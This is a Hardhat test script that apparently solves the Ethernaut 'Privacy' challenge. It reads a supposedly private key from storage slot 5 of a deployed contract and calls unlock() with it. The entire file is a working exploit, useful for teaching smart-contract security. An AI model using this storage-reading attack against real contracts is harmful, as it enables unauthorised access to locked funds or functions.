const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("Vault hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        privacy = await ethers.getContractAt("Privacy", process.env.PRIVACY_ADDRESS);
});
    describe("Hack test", function() {
        it("Should unlock the privacy", async function() {
            expect(await privacy.locked()).to.equal(true);
            key_data = await ethers.provider.getStorageAt(process.env.PRIVACY_ADDRESS, 5);
            key = await key_data.slice(0,34); //0x||16bytes data
            await privacy.unlock(key);
            expect(await privacy.locked()).to.equal(false);
        });
    });
});